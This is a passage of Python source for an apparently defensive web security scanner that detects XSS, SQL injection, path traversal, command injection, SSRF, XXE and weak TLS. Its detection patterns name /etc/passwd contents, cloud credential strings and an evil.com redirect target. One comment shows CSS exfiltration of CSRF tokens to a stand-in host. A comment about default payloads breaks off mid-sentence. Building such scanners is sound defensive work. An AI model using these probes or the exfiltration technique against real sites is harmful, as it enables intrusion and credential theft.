#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Offline Web Security Assessment Tool  ("ScriptKiddie-Recon")
=========================================================

PURPOSE
-------
This tool automates the repetitive, evidence-heavy stages of a web
application security assessment in an airgapped environment. It is
explicitly NOT an automated vulnerability scanner that fires verdicts;
every active finding is flagged "Unverified - Requires Manual
Confirmation" and is shipped with the raw HTTP request/response pair,
an execution trail, and (for high-severity issues) a screenshot taken
at the exact moment the issue was triggered. A qualified human engineer
must audit each result before any remediation is taken.

DESIGN PRINCIPLES (read these before editing the file)
------------------------------------------------------
1. VERBOSE BY DEFAULT.
   Every request, response status, and regex match is streamed to
   stdout AND to a structured JSON trail. There is intentionally NO
   --quiet flag. Silence is a black box; visibility is the contract.

2. EVIDENCE-FIRST.
   Each active probe persists raw request, raw response, DOM snapshot,
   and (for high-severity findings) a screenshot at the exact moment
   the issue was triggered. File names are UUID + timestamp so they
   survive parallel runs without collision.

3. SCOPE-AWARE.
   The crawler respects --scope (allow patterns), --exclude (deny
   patterns), robots.txt 'User-agent: * Disallow' rules, and the
   target's registrable domain by default. Every override is an
   explicit, named flag (--ignore-robots, --allow-external).

4. NO CLOUD.
   Zero external CDNs, telemetry, or hard-coded LLM endpoints. The
   only network traffic goes to the target (and an optional,
   user-supplied LLM endpoint used ONLY for executive-summary text,
   which degrades gracefully if unreachable).

5. GRACEFUL DEGRADATION.
   If Playwright crashes, the LLM endpoint is unreachable, or the user
   hits Ctrl+C, the tool saves whatever evidence it has and renders a
   partial report with a prominent "INTERRUPTED" banner.

USAGE
-----
    python scanner.py \\
        --url https://target.example.com \\
        --headers whitelist.txt \\
        --payloads payloads.txt \\
        --output ./scan_report \\
        --depth 3 \\
        --delay 500 \\
        --concurrency 1 \\
        --scope "/app/*,/api/v1/*" \\
        --exclude "*/logout,*/delete,*.pdf"

LEARNING NOTES
--------------
This file is intentionally comment-heavy. Treat it as a textbook on
how a defensive-minded offensive tool is structured. Pay attention to:
  - The signal handler design (why we use asyncio.Event, not threading)
  - The rate limiter (why we jitter ±10%)
  - The scope enforcement (how we keep the crawler from escaping)
  - The evidence naming (UUIDs prevent collisions; timestamps aid audit)
  - The regex matching (why we prefer strict patterns over heuristics)

DEPENDENCIES
------------
- playwright        (async browser automation; install chromium via
                     `playwright install chromium`)
- python-dotenv     (optional; for loading LLM credentials from .env)
- Python >= 3.10    (uses asyncio, dataclasses, typing as stdlib)

License: internal use only. Not for redistribution.
"""

# ============================================================================
# SECTION 1 — IMPORTS
# ============================================================================
#
# We deliberately restrict imports to:
#   (a) the Python standard library, and
#   (b) `playwright` and `python-dotenv`.
# This keeps the tool runnable in an airgapped environment where pip
# mirrors may be unavailable. No requests/httpx/aiohttp — Playwright's
# network stack is our only HTTP client because it executes JavaScript,
# which is essential for SPA targets and for capturing post-render DOM
# reflections of XSS payloads.
# ============================================================================

import argparse          # CLI parsing (stdlib)
import asyncio           # Async orchestration for Playwright (stdlib)
import base64            # Embed screenshots into the HTML report (stdlib)
import fnmatch           # Glob-style pattern matching for --scope/--exclude
import json              # Structured logs + JSON evidence files (stdlib)
import logging           # Verbose console logging (stdlib)
import os                # Env vars + path operations (stdlib)
import random            # Jitter for rate limiter (stdlib)
import re                # Strict regex matching for finding detection
import signal            # SIGINT/SIGTERM graceful shutdown (stdlib)
import socket            # SSL cert retrieval for TLS inspection (stdlib)
import ssl               # Certificate + cipher suite inspection (stdlib)
import sys               # Exit codes + stdout (stdlib)
import threading         # Heartbeat lock + watchdog threads (stdlib)
import time              # Rate-limit timing (stdlib)
import uuid              # Unique evidence filenames (stdlib)
import warnings          # Suppress intentional ssl.TLSVersion.TLSv1 deprecation
from collections import deque  # BFS queue for the crawler (stdlib)
from dataclasses import dataclass, field, asdict  # Structured records
from datetime import datetime, timezone, timedelta  # Cert expiry math
from pathlib import Path  # Cross-platform path handling (stdlib)
from typing import Optional, Dict, List, Tuple, Any, Set, Iterable  # Types
from urllib.parse import urlparse, urljoin, parse_qs, urlencode  # URL ops

# We intentionally set ctx.minimum_version = ssl.TLSVersion.TLSv1 in the
# SSL inspector so we can DETECT servers that still negotiate TLS 1.0/1.1.
# Python 3.12+ emits a DeprecationWarning when this constant is referenced.
# The deprecation only affects the *constant*; the runtime behaviour of
# allowing TLS 1.0 connections is unchanged. We suppress the warning at
# import time so it doesn't pollute the verbose log output.
warnings.filterwarnings(
    "ignore",
    message="ssl.TLSVersion.TLSv1 is deprecated",
    category=DeprecationWarning,
)

# --- Third-party imports with graceful fallback ----------------------------
#
# We wrap Playwright and dotenv imports in try/except so the user gets a
# friendly, actionable error message instead of an opaque ImportError stack.
# This matters in airgapped environments where wheels may be missing.

try:
    from playwright.async_api import (
        async_playwright,
        Browser,
        BrowserContext,
        Page,
        Request as PWRequest,
        Response as PWResponse,
        TimeoutError as PWTimeoutError,
    )
except ImportError as _e:  # pragma: no cover - environment guard
    print(
        "[FATAL] playwright is not installed.\n"
        "        Install with:  pip install playwright\n"
        "        Then run:      playwright install chromium\n"
        f"        Underlying error: {_e}",
        file=sys.stderr,
    )
    sys.exit(2)

try:
    from dotenv import load_dotenv  # type: ignore
    _HAS_DOTENV = True
except ImportError:
    _HAS_DOTENV = False


# ============================================================================
# SECTION 2 — CONSTANTS, DEFAULTS, AND REGEX PATTERNS
# ============================================================================
#
# All tunable defaults and detection signatures live here so reviewers can
# audit them in one place. Each regex below has a comment explaining WHICH
# real-world vulnerability class it detects and WHY a strict pattern was
# chosen over a fuzzy heuristic.
# ============================================================================

# --- Default reference header list -----------------------------------------
#
# This list is ONLY used if the user omits --headers. It is NOT a "good
# headers" list — it is a reference list that helps the engineer quickly
# spot which response headers are EXPECTED (in the reference) versus
# UNEXPECTED (potential anomalies). The user is encouraged to supply their
# own whitelist.txt tailored to their organisation's baseline.
DEFAULT_REFERENCE_HEADERS: List[str] = [
    "Strict-Transport-Security",   # HSTS — forces HTTPS
    "Content-Security-Policy",     # CSP — mitigates XSS/data injection
    "X-Frame-Options",             # Clickjacking mitigation (legacy)
    "X-Content-Type-Options",      # MIME sniffing mitigation
    "Referrer-Policy",             # Controls Referer leakage
    "Permissions-Policy",          # Browser feature lockdown
    "X-XSS-Protection",            # Legacy IE XSS filter (deprecated)
    "Cache-Control",               # Caching directives
    "Set-Cookie",                  # Session cookies
    "Server",                      # Server banner (info disclosure risk)
    "X-Powered-By",                # Framework banner (info disclosure risk)
]

# --- Default fuzzing payloads ----------------------------------------------
#
# Used only when --payloads is omitted. Drawn from the OWASP XSS Prevention
# Cheat Sheet and the OWASP SQL Injection Cheat Sheet. The list is small
# --- Payload loading -------------------------------------------------------
#
# Payloads are loaded ONLY from bin/payloads.txt. There is NO hardcoded
# fallback list in the source code. If the file is missing or empty, the
# scanner prints a warning and skips active fuzzing.
#
# The user controls the payload list entirely via:
#   1. The Settings tab → Default Payloads textarea (saved to DB)
#   2. The New Scan form → Payloads textarea (per-scan override)
#   3. The --payloads CLI flag (points to a .txt file)
#   4. Editing bin/payloads.txt directly


# --- XSS detection regexes -------------------------------------------------
#
# IMPORTANT: We deliberately use STRICT patterns here. A fuzzy heuristic
# (e.g. "did the payload string appear anywhere in the response?") produces
# too many false positives in audit contexts and erodes engineer trust.
# Instead we look for CONCRETE evidence of execution or unescaped reflection
# of dangerous HTML/JS constructs. Every match is still labelled
# "Unverified - Requires Manual Confirmation" because regex cannot prove
# that a browser would actually execute the reflected content.
XSS_REFLECTION_PATTERNS: List[Tuple[str, "re.Pattern"]] = [
    # Match: <script...>alert(...)...</script>  (case-insensitive, multi-line)
    # Detects the canonical XSS execution signature. The non-greedy .*? is
    # critical: without it the regex could span multiple script blocks and
    # produce misleading matches on large pages.
    ("script_alert_block",
     re.compile(r"<script[^>]*>.*?alert\s*\([^)]*\).*?</script>",
                re.IGNORECASE | re.DOTALL)),
    # Match any onX event handler pointing at alert(...) — e.g. onerror=alert(1)
    # The \s*= allows whitespace around the equals sign, which is legal HTML.
    # We require alert( to be followed by a digit, single quote, or empty paren
    # to avoid matching function names like `myalert_handler(` which contain
    # the substring `alert(`. Tightened from the original which matched any
    # function whose name ended in `alert`.
    ("onx_event_alert",
     re.compile(r"on\w+\s*=\s*['\"]?[^'\"]*\balert\s*\(\s*[1-9'\"]?", re.IGNORECASE)),
    # Match javascript:alert(...) — a URI-scheme XSS sink commonly seen in
    # href attributes. We allow whitespace between 'javascript' and ':' because
    # browsers tolerate it (a real attack surface).
    ("javascript_uri_alert",
     re.compile(r"javascript\s*:\s*alert\s*\(", re.IGNORECASE)),
    # Match an UNMODIFIED reflection of our exact probe payload. This catches
    # sinks that don't execute but DO reflect — the engineer can then decide
    # whether the surrounding context would allow execution (e.g. inside an
    # attribute vs. inside a textarea).
    ("exact_payload_reflection",
     re.compile(re.escape("<script>alert(1)</script>"), re.IGNORECASE)),
]

# --- SQLi error-signature regexes -----------------------------------------
#
# Different DB engines emit different error strings when malformed SQL is
# injected. We pattern-match the most common ones. Each entry is annotated
# with the engine it detects. False positives are possible if the
# application deliberately echoes user input containing these strings
# (e.g. a search-results page that says "no results for 'SQL syntax'");
# the engineer must verify the response is genuinely an SQL error.
SQLI_ERROR_PATTERNS: List[Tuple[str, "re.Pattern"]] = [
    # MySQL / MariaDB — the canonical "you have an error in your SQL syntax"
    ("mysql_sql_syntax",
     re.compile(r"SQL syntax.*?MySQL", re.IGNORECASE | re.DOTALL)),
    ("mysql_error_near",
     re.compile(r"You have an error in your SQL syntax.*?near", re.IGNORECASE | re.DOTALL)),
    ("mysql_warning",
     re.compile(r"mysql_fetch_\w+\(\)", re.IGNORECASE)),
    # PostgreSQL — PG::SyntaxError or "ERROR:  syntax error at or near"
    ("postgresql_syntax",
     re.compile(r"PG::SyntaxError|ERROR:\s+syntax error at or near", re.IGNORECASE)),
    # Microsoft SQL Server — "Unclosed quotation mark after the character string"
    ("mssql_unclosed_quote",
     re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE)),
    ("mssql_sqlserver",
     re.compile(r"Microsoft SQL Server.*?\[SQLServer\]", re.IGNORECASE | re.DOTALL)),
    # Oracle — ORA-xxxxx error codes
    ("oracle_ora",
     re.compile(r"ORA-\d{5}"), ),
    # SQLite — "SQLITE_ERROR" or "SQLite3::query"
    ("sqlite_error",
     re.compile(r"SQLite3?::query|SQLITE_ERROR|sqlite3\.OperationalError", re.IGNORECASE)),
    # Generic — fallback "SQL syntax error" pattern. Lower confidence.
    # Tightened to require the literal word "SQL" (case-insensitive) before
    # "syntax error" to avoid matching JS/JSON/CSS syntax errors in build
    # logs or browser console output.
    ("generic_sql_syntax",
     re.compile(r"\bSQL\b[^\n]{0,80}?syntax error", re.IGNORECASE)),
]

# --- Path Traversal detection patterns ------------------------------------
#
# These match indicators that a traversal payload successfully read a
# system file. We look for the file contents (passwd, win.ini) in the
# response, not the payload itself.
PATH_TRAVERSAL_PATTERNS: List[Tuple[str, "re.Pattern"]] = [
    # Linux /etc/passwd — the canonical traversal target.
    # Match the passwd file format: "root:x:0:0:root:/root:/bin/bash"
    ("passwd_file",
     re.compile(r"root:[x*]:0:0:", re.IGNORECASE)),
    # Windows win.ini — require the [fonts] / [extensions] header PLUS
    # a typical ini-file line that follows it (e.g. `code=` or `TTFontDriver=`).
    # The bare header alone matched too broadly (legit HTML/CSS uses [files]).
    ("win_ini_file",
     re.compile(r"\[(?:fonts|extensions)\]\s*[\r\n]+\s*\w+\s*=", re.IGNORECASE)),
    # Removed: ("traversal_reflection", re.compile(r"\.\./\.\./"))
    # This pattern matched ANY `../../` in the response — including relative
    # URLs in HTML (`<a href="../../home">`), CSS imports, JS template
    # strings, etc. Too many false positives. The other two patterns above
    # (passwd_file, win_ini_file) match the actual file CONTENTS, which is
    # the only reliable indicator that traversal succeeded.
]

# --- Command Injection detection patterns ---------------------------------
#
# These match the OUTPUT of commands that would only appear if the
# server executed the injected command.
CMD_INJECTION_PATTERNS: List[Tuple[str, "re.Pattern"]] = [
    # `whoami` output — a single word (username), often on its own line.
    # We look for it in a context that suggests it's the command output,
    # not just reflected in the page. Since we can't be 100% sure, we
    # flag any response containing these indicators.
    ("whoami_output",
     re.compile(
         r"^(?:root|www-data|wwwrun|nginx|apache|apache2|httpd|daemon|nobody|"
         r"nogroup|bin|sys|mail|news|uucp|operator|admin|administrator|"
         r"guest|user|ubuntu|centos|debian|fedora|alpine|bot)$",
         re.MULTILINE | re.IGNORECASE,
     )),
    # `whoami` on Windows prints "DOMAIN\user" (e.g. "DESKTOP-ABC\bob"). The
    # backslash-separated HOST\user form is rare in normal page content, so
    # this is a fairly specific signal (lower FP than a bare-username match).
    ("whoami_windows",
     re.compile(r"\b[A-Za-z0-9][A-Za-z0-9-]{0,63}\\[A-Za-z0-9._-]{1,104}\b")),
    # `id` output — "uid=0(root) gid=0(root) groups=0(root)"
    ("id_output",
     re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+")),
    # `ping` output — "PING 127.0.0.1 (127.0.0.1)"
    ("ping_output",
     re.compile(r"PING\s+\d+\.\d+\.\d+\.\d+", re.IGNORECASE)),
    # Command substitution artifact — if $({whoami}) was reflected
    # literally, it means the shell didn't execute it. If it was
    # REPLACED with a username, the shell did execute it.
    ("cmd_substitution_not_reflected",
     re.compile(r"\$\(\{?whoami\}?\)", re.IGNORECASE)),
]

# --- CMDi echo canary ------------------------------------------------------
# Reliable, cross-platform CMDi signal. We inject a payload containing
# `echo <CANARY>`; if the server executes it, the response contains the bare
# CANARY token (the echo output) but NOT the literal `echo <CANARY>` command
# text (it was consumed by the shell). This mirrors the proven SSTI canary
# (literal gone + computed artifact present) and catches embedded-in-JSON /
# Windows-output cases that the whoami regexes miss.
CMDI_ECHO_CANARY = "wrcanda7ry"
CMDI_ECHO_CANARY_RE = re.compile(r"\becho\s+" + CMDI_ECHO_CANARY + r"\b", re.IGNORECASE)


def _cmdi_echo_canary_hit(payload: str, combined: str) -> bool:
    """True if the echo-canary fired: payload carried the canary command, the
    canary token appears in the response, but the literal command text does
    NOT (it was executed, not reflected)."""
    if CMDI_ECHO_CANARY not in payload.lower():
        return False
    lower = combined.lower()
    if CMDI_ECHO_CANARY not in lower:
        return False  # token absent entirely — not executed
    # If the literal "echo <canary>" command text is still present, the
    # payload was reflected verbatim, NOT executed.
    if CMDI_ECHO_CANARY_RE.search(combined):
        return False
    return True


# --- Open Redirect detection ----------------------------------------------
#
# For open redirect, we check if the response's Location header points
# to our injected external URL. This is checked separately in the active
# scanner because it requires inspecting the response headers, not just
# the body.
OPEN_REDIRECT_INDICATOR = re.compile(
    r"https?://evil\.com|//evil\.com", re.IGNORECASE
)

# --- SSTI (Server-Side Template Injection) detection ----------------------
#
# If {{7*7}} is evaluated by the template engine, the response will
# contain "49" instead of "{{7*7}}". We check for the computed result.
SSTI_PATTERNS: List[Tuple[str, "re.Pattern"]] = [
    # {{7*7}} → 49 (Jinja2, Twig, Django templates)
    ("ssti_jinja_49",
     re.compile(r"(?<!\d)49(?!\d)")),
    # ${7*7} → 49 (FreeMarker, Velocity) — same detection.
    # We use a separate label for clarity in the report.
    ("ssti_freemarker_49",
     re.compile(r"(?<!\d)49(?!\d)")),
    # #{7*7} → 49 (Ruby ERB, Thymeleaf)
    ("ssti_ruby_49",
     re.compile(r"(?<!\d)49(?!\d)")),
    # <%=7*7%> → 49 (EJS, ERB)
    ("ssti_ejs_49",
     re.compile(r"(?<!\d)49(?!\d)")),
]

# --- SSRF detection patterns ----------------------------------------------
#
# SSRF is blind by nature — the server fetches our injected URL and we
# usually don't see the response. With no external collaborator (airgap),
# we rely on two reflected signals:
#   1. Cloud metadata content reflected in the response (AWS/GCP/Azure
#      instance-metadata endpoints return machine-readable text that's
#      very unlikely to appear otherwise).
#   2. Internal-fetch error messages leaked back to us (frameworks often
#      surface "Connection refused" / "Name resolution failed" when the
#      server tried to fetch our internal URL).
# Blind SSRF (server fetches silently, returns nothing useful) is NOT
# detectable this way — that needs an out-of-band listener (offered as a
# future option).
SSRF_PATTERNS: List[Tuple[str, "re.Pattern"]] = [
    # AWS EC2 instance metadata — ami-id is the strongest single signal.
    ("ssrf_aws_ami",
     re.compile(r"ami-[0-9a-f]{8,17}", re.IGNORECASE)),
    ("ssrf_aws_instance_id",
     re.compile(r"\bi-[0-9a-f]{8,17}\b", re.IGNORECASE)),
    ("ssrf_aws_security_credentials",
     re.compile(r"AccessKeyId|SecretAccessKey|Token\s*:\s*", re.IGNORECASE)),
    ("ssrf_aws_instance_identity",
     re.compile(r"instance-identity/document", re.IGNORECASE)),
    ("ssrf_aws_account",
     re.compile(r'"accountId"\s*:\s*"\d{12}"', re.IGNORECASE)),
    # GCP / Azure metadata endpoints.
    ("ssrf_gcp_metadata",
     re.compile(r'"email"\s*:\s*"[^"]+@[^"]+\.iam\.gserviceaccount\.com"',
                re.IGNORECASE)),
    ("ssrf_gcp_compute",
     re.compile(r"computeMetadata|metadata\.google\.internal",
                re.IGNORECASE)),
    # Internal-fetch error messages leaked from the server's HTTP client.
    ("ssrf_conn_refused",
     re.compile(r"Connection refused|Connection reset by peer",
                re.IGNORECASE)),
    ("ssrf_dns_failure",
     re.compile(r"Name or service not known|Name resolution failed|"
                r"getaddrinfo\s*(?:failed|\()|php_network_getaddresses|"
                r"No address associated with hostname",
                re.IGNORECASE)),
    ("ssrf_connect_failed",
     re.compile(r"Failed to connect to|cURL error \d+|curl:\s*\(\d+\)",
                re.IGNORECASE)),
    # /etc/passwd via file:// or a fetching parser — reuse the passwd marker.
    ("ssrf_passwd",
     re.compile(r"root:[x*]:0:0:", re.IGNORECASE)),
]

# --- XXE (XML External Entity) detection patterns -------------------------
#
# XXE fires when an XML-consuming endpoint processes our external-entity
# payload. Detection = the fetched file's CONTENTS (passwd / win.ini) appear
# in the response, or the parser echoes the DOCTYPE/ENTITY back, or a parser
# error reveals it attempted entity resolution.
XXE_PATTERNS: List[Tuple[str, "re.Pattern"]] = [
    # Linux /etc/passwd contents read via file:// entity.
    ("xxe_passwd",
     re.compile(r"root:[x*]:0:0:", re.IGNORECASE)),
    # Windows win.ini contents.
    ("xxe_win_ini",
     re.compile(r"\[(?:fonts|extensions)\]\s*[\r\n]+\s*\w+\s*=",
                re.IGNORECASE)),
    # Some parsers echo the DOCTYPE / ENTITY declarations back when they
    # reject the input — a weak but real signal that XML parsing happened.
    ("xxe_entity_echoed",
     re.compile(r"<!DOCTYPE[^>]*>|<!ENTITY[^>]*>", re.IGNORECASE)),
    # Parser errors that mention entity / DTD processing — confirms the
    # endpoint parses XML and attempted external-entity resolution.
    ("xxe_parser_entity_error",
     re.compile(r"ENTITY|external entity|DTD|DOCTYPE",
                re.IGNORECASE)),
]

# --- CSS injection context detection --------------------------------------
#
# CSS injection = the app reflects attacker-controlled input into a
# CSS-executable context: a <style>...</style> block or a style="..."
# attribute. An attacker who controls CSS in the victim's browser can
# exfiltrate data (e.g. input[value^="csrf-..."] { background:
# url(//evil/?x=...) } to leak CSRF tokens character-by-character), abuse
# :visited history, or deceive the UI (hide/overlay elements). This is a
# real A05 injection class — distinct from XSS (HTML/JS context).
#
# Detection = check whether the injected payload appears INSIDE one of
# these CSS contexts. Pure reflection into the body is NOT CSS injection;
# it must land in a stylesheet context to be exploitable as CSS.

# Matches <style>...</style> blocks (the payload is dangerous if it lands
# inside the block content).
_CSS_STYLE_BLOCK_RE = re.compile(r"<style[^>]*>(.*?)</style>",
                                 re.IGNORECASE | re.DOTALL)
# Matches style="..." / style='...' attribute VALUES.
_CSS_STYLE_ATTR_RE = re.compile(r"""style\s*=\s*(["'])(.*?)\1""",
                                re.IGNORECASE | re.DOTALL)


def css_injection_context(payload: str, text: str) -> str:
    """Return a CSS-injection context label if `payload` is reflected into a
    CSS-executable context within `text`, else "".

    Labels: "style_block" (inside <style>) or "style_attribute" (inside
    style="..."). Returns "" when the payload isn't reflected at all or only
    appears in a non-CSS context (regular HTML body / JS / attribute value).
    """
    if not payload or len(payload) < 2 or not text:
        return ""
    # Cheap pre-check: must be reflected somewhere.
    if payload not in text:
        return ""
    for m in _CSS_STYLE_BLOCK_RE.finditer(text):
        if payload in m.group(1):
            return "style_block"
    for m in _CSS_STYLE_ATTR_RE.finditer(text):
        if payload in m.group(2):
            return "style_attribute"
    return ""

# --- Weak-cipher / weak-protocol policy -------------------------------------
#
# The authoritative source for "what counts as weak" is the EDITABLE file
# bin/weak_ciphers.txt. The user adds newly-disclosed cipher CVEs there (one
# line per entry, no code change). Both the negotiated-cipher check and the
# SSL cipher-suite probe enumeration consume the parsed policy below, so a
# new entry takes effect everywhere.
#
# `_load_weak_cipher_policy()` parses that file into a list of WeakPolicyEntry
# records at import time. If the file is missing (e.g. someone deleted it),
# we fall back to the hardcoded SEED below so the scanner still runs.
#
# Format in the file (one entry per line):
#   PATTERN | REASON | SEVERITY          <- cipher substring
#   @TLS PROTOCOL | REASON | SEVERITY    <- weak TLS/SSL protocol version
# Lines starting with "#" and blank lines are ignored.


class WeakPolicyEntry:
    """One row of the editable weak-cipher/protocol policy.

    Kept as a plain class (not a dataclass) so it has no required field
    ordering and is cheap to construct at import time.

    match_mode controls how `pattern` matches a cipher name:
      - "substring" (default): case-insensitive substring (`pattern in name`).
      - "re": pattern is a regex, matched via compiled_re.search (case-insensitive).
        Needed for rules like SHA-1 ("-SHA$") where substring would also catch
        SHA-256/SHA-384 ("-SHA" is a substring of "-SHA256").
    """

    __slots__ = ("pattern", "reason", "severity", "kind", "match_mode", "compiled_re")

    def __init__(self, pattern: str, reason: str, severity: str, kind: str,
                 match_mode: str = "substring",
                 compiled_re: Optional["re.Pattern"] = None) -> None:
        self.pattern = pattern
        self.reason = reason
        self.severity = severity.lower().strip()
        self.kind = kind  # "cipher" or "tls"
        self.match_mode = match_mode  # "substring" | "re"
        self.compiled_re = compiled_re  # set when match_mode == "re"


# Hardcoded seed, used ONLY if bin/weak_ciphers.txt is absent. Mirrors the
# file's default contents so behaviour is identical with or without the file.
_WEAK_POLICY_SEED: List[WeakPolicyEntry] = [
    WeakPolicyEntry("NULL",   "No encryption at all",                     "high",   "cipher"),
    WeakPolicyEntry("EXPORT", "Export-grade, sub-512-bit (1990s US law)", "high",   "cipher"),
    WeakPolicyEntry("RC4",    "RC4 stream biases (AlFardan et al. 2013)", "high",   "cipher"),
    WeakPolicyEntry("CBC3",   "Triple-DES via 3-key CBC (Sweet32, CVE-2016-2183)", "medium", "cipher"),
    WeakPolicyEntry("3DES",   "Sweet32 birthday attack (CVE-2016-2183)",  "medium", "cipher"),
    WeakPolicyEntry("RC2",    "Legacy block cipher, cryptographically broken", "medium", "cipher"),
    WeakPolicyEntry("DES",    "56-bit key, brute-forceable in hours",     "high",   "cipher"),
    WeakPolicyEntry("MD5",    "Collision-prone message digest",           "medium", "cipher"),
    WeakPolicyEntry("PSK",    "Pre-shared key; deployment-specific, review manually", "low", "cipher"),
    # SHA-1 integrity (e.g. AES128-SHA, ECDHE-RSA-AES128-SHA). MUST be regex
    # anchored at end-of-string so it does NOT match SHA-256/SHA-384
    # ("-SHA" is a substring of "-SHA256") or TLS 1.3 suites (..._SHA384).
    WeakPolicyEntry("-SHA$", "SHA-1 message digest (collision-prone, deprecated for TLS integrity)",
                    "medium", "cipher", match_mode="re",
                    compiled_re=re.compile(r"-sha$", re.IGNORECASE)),
    WeakPolicyEntry("SSLv2",  "Broken protocol (DROWN, CVE-2016-0800)",   "high",   "tls"),
    WeakPolicyEntry("SSLv3",  "POODLE attack (CVE-2014-3566)",            "high",   "tls"),
    WeakPolicyEntry("TLSv1",  "Deprecated - no forward secrecy, BEAST risk", "high", "tls"),
    WeakPolicyEntry("TLSv1.1", "Deprecated by PCI-DSS (June 2018)",       "medium", "tls"),
]


def _load_weak_cipher_policy(
    logger: Optional["ExecutionTrailLogger"] = None,
    policy_path: Optional[Path] = None,
) -> List[WeakPolicyEntry]:
    """Parse bin/weak_ciphers.txt (or a per-scan override) into WeakPolicyEntry.

    The file is the single source of truth for what the scanner considers a
    weak cipher or protocol version. See the docstring at the top of that
    file for the format.

    ``policy_path`` overrides the default bin/weak_ciphers.txt (used by the
    ``--weak-ciphers`` per-scan override).

    Returns the hardcoded _WEAK_POLICY_SEED (with a log warning) if the file
    is missing, unreadable, or contains no valid entries — so the scanner
    never crashes on a malformed policy file.
    """
    if policy_path is None:
        policy_path = Path(__file__).resolve().parent / "weak_ciphers.txt"
    entries: List[WeakPolicyEntry] = []
    try:
        raw = policy_path.read_text(encoding="utf-8", errors="replace")
    except Exception as e:  # file missing / unreadable
        if logger is not None:
            logger.log("weak_cipher_policy",
                       f"could not read {policy_path.name}: {e}; using seed defaults")
        return list(_WEAK_POLICY_SEED)

    for line_no, raw_line in enumerate(raw.splitlines(), 1):
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            pattern, reason, severity = (part.strip() for part in line.split("|", 2))
        except ValueError:
            if logger is not None:
                logger.log("weak_cipher_policy",
                           f"line {line_no}: skipped malformed entry: {raw_line!r}")
            continue
        if not pattern or not severity:
            continue
        # "@RE" prefix marks a regex rule (matched with re.search, IGNORECASE).
        # Needed for rules like SHA-1 ("-SHA$") where substring matching would
        # also catch SHA-256/SHA-384.
        match_mode = "substring"
        compiled_re: Optional["re.Pattern"] = None
        if pattern.startswith("@RE"):
            regex_pat = pattern[3:].strip()
            if not regex_pat:
                continue
            try:
                compiled_re = re.compile(regex_pat, re.IGNORECASE)
            except re.error as re_err:
                if logger is not None:
                    logger.log("weak_cipher_policy",
                               f"line {line_no}: invalid regex {regex_pat!r}: {re_err}; skipped")
                continue
            match_mode = "re"
            pattern = regex_pat  # store the regex source as `pattern` for display
        # "@TLS" prefix marks a protocol-version entry.
        kind = "cipher"
        if pattern.startswith("@TLS"):
            kind = "tls"
            # remainder after the "@TLS" token
            pattern = pattern[4:].strip()
            if not pattern:
                continue
        entries.append(WeakPolicyEntry(pattern, reason or "Weak per policy", severity, kind,
                                       match_mode=match_mode, compiled_re=compiled_re))

    if not entries:
        if logger is not None:
            logger.log("weak_cipher_policy",
                       f"{policy_path.name} contained no valid entries; using seed defaults")
        return list(_WEAK_POLICY_SEED)
    return entries


# Parsed at import time. Code below consumes WEAK_POLICY (structured, with
# reasons/severity) and the two flat derived lists (back-compat for any
# caller that just wants the patterns).
WEAK_POLICY: List[WeakPolicyEntry] = _load_weak_cipher_policy()
WEAK_CIPHER_SUBSTRINGS: List[str] = [e.pattern for e in WEAK_POLICY if e.kind == "cipher"]
WEAK_TLS_VERSIONS: List[str] = [e.pattern for e in WEAK_POLICY if e.kind == "tls"]


def _classify_cipher_strength(cipher_name: str) -> Tuple[str, str, str]:
    """Return (strength, reason, severity) for a cipher suite name.

    strength is "weak" if any WEAK_POLICY cipher rule matches, otherwise
    "strong". Matching is case-insensitive substring by default; rules with
    match_mode="re" use re.search (so SHA-1 can be anchored with "-SHA$"
    without also matching -SHA256/-SHA384).
    """
    lower = (cipher_name or "").lower()
    for entry in WEAK_POLICY:
        if entry.kind != "cipher":
            continue
        if entry.match_mode == "re":
            if entry.compiled_re is not None and entry.compiled_re.search(lower):
                return ("weak", entry.reason, entry.severity)
        elif entry.pattern.lower() in lower:
            return ("weak", entry.reason, entry.severity)
    return ("strong", "", "info")

# --- Exit codes ------------------------------------------------------------
EXIT_OK = 0
EXIT_INTERRUPTED = 130      # standard for SIGINT
EXIT_RUNTIME_ERROR = 1
EXIT_CONFIG_ERROR = 2


# ============================================================================
# SECTION 3 — DATA CLASSES (Structured Records)
# ============================================================================
#
# We use frozen=False dataclasses because evidence records are built up
# incrementally (e.g. an active check starts, runs, then records its result).
# Keeping these typed makes the HTML report generation straightforward —
# asdict() converts any record to a JSON-serialisable dict.
# ============================================================================

@dataclass
class HeaderRecord:
    """A single HTTP response header captured during navigation.

    The `expected_value` and `value_matches_expected` fields support the
    "whitelist as policy" feature: if the user's whitelist.txt declares
    an expected value (e.g. `Strict-Transport-Security: max-age=31536000`),
    we compare the actual response value against it and flag mismatches
    in Table C of the Header Analysis tab.

    A header with no expected value declared in the whitelist has
    `expected_value=""` and `value_matches_expected=True` (vacuously).

    The `source_url` field records WHICH response the header came from
    (the main HTML page, a CSS file, a JS file, etc.). This lets the
    UI group headers by response instead of showing duplicates.
    """
    name: str
    value: str
    in_reference: bool                  # Was this header name in the whitelist?
    expected_value: str = ""            # Expected value from whitelist ("" = any)
    value_matches_expected: bool = True # False only if expected was set AND mismatched
    source_url: str = ""                # URL of the response this header came from


@dataclass
class CrawledURL:
    """A URL discovered by the crawler, with metadata about how it was found."""
    url: str
    depth: int
    source: str          # 'a_href', 'form_action', 'js_fetch', 'js_location'
    in_scope: bool
    method: str = "GET"  # default; 'POST' if discovered from a form


@dataclass
class InputField:
    """A user-controllable input discovered by the Attack Surface Mapper."""
    location: str        # 'form' | 'url_param' | 'fetch_body' | 'custom_header'
    url: str
    method: str          # 'GET' | 'POST' | etc.
    name: str            # input/param name
    input_type: str = "" # HTML input type attribute (text, hidden, ...)
    current_value: str = ""  # value observed during crawling (for context)


@dataclass
class Finding:
    """An unverified finding. ALL fields must be present for the HTML report."""
    finding_id: str               # UUID for cross-referencing evidence files
    owasp_category: str           # e.g. 'A05:2025 Injection'
    title: str
    severity: str                 # 'High' | 'Medium' | 'Low' | 'Info'
    url: str
    payload: str = ""
    request_raw: str = ""
    response_raw: str = ""
    execution_trail: List[str] = field(default_factory=list)
    screenshot_path: Optional[str] = None  # absolute path to PNG, if any
    patterns_matched: List[str] = field(default_factory=list)
    unverified: bool = True       # ALWAYS True — we never auto-confirm


@dataclass
class SSLRecord:
    """TLS certificate + cipher review findings."""
    hostname: str
    port: int
    issuer: str = ""
    subject: str = ""
    not_before: str = ""
    not_after: str = ""
